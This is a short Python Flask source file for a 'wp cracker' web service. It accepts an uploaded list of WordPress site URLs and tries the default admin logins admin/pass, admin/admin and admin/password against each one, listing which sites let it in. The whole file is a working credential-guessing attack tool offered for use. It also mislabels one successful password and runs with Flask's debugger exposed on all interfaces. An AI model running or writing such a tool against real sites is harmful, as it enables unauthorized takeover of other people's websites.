import login
from flask import *
app=Flask('__name__')
@app.route('/')
def index():
	return 'wellcome to wp cracker'
@app.route('/crack',methods=['GET','POST'])
def auto_wp():
	x=request.files['list_url'].read().decode('utf-8').split('\n')
	x.remove('')
	ve=[]
	if request.files['list_url']:
		for j in x:
			if login.__start__(j,'admin','pass') == True:
				ve.append('[sukses] username : %s password : %s result : %s'%('admin','pass',j))
			elif login.__start__(j,'admin','admin') == True:
				ve.append('[sukses] username : %s password : %s result : %s'%('admin','admin',j))
			elif login.__start__(j,'admin','password') == True:
				ve.append('[sukses] username : %s password : %s result : %s'%('admin','pass',j))
			else:
				ve.append(' [gagal!] result : %s'%(j))
		return str(ve)
	else:
		return 'error'
app.run(host='0.0.0.0',port=8000,debug=True)
